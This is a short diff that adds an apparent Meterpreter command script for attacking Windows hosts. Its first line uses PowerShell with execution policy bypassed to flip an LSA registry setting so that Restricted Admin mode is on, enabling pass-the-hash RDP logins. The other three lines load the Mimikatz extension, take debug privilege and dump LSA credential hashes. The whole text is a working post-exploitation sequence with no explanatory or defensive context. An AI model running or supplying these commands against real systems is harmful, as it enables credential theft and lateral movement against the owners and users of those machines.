@@ -1,0 +1,4 @@
+execute -f powershell.exe -a "-NoProfile -ExecutionPolicy Bypass -Command \"New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DisableRestrictedAdmin -Value 0\""
+load kiwi
+kiwi_cmd privilege::debug
+kiwi_cmd lsadump::lsa /patch
